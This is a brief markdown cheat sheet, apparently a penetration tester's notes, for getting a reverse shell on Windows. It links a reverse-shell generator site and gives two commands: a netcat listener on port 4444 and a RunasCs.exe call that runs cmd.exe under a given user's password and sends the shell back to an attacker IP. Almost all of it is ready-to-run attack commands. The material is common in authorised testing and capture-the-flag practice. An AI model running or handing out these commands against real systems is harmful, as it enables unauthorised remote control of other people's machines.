# Reverse Shell Cheat Sheet
## Tools
- [revhsells.com](https://revshells.com)

## Reverse Shell
### RunasCs.exe cmd
```
# Netcat listening on 4444
nc -lvnp 4444

# RunasCs cmd.exe to attack host 
.\RunasCs.exe [user] [password] cmd.exe -r [IP]:4444
```
